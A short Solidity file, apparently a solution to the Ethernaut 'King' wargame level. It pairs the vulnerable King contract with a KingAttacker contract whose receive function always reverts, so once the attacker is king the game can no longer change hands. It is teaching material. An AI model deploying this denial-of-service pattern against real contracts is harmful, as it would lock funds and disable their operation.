// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract KingAttacker {
  error CustomError();
  King victim;
  address owner;

  constructor(address owner_, address victim_) {
    owner = owner_;
    victim = King(payable(victim_));
  }

  function attack() external payable {
    payable(address(victim)).call{value: msg.value}('');
  }

  receive() external payable {
    revert CustomError();
  }
}
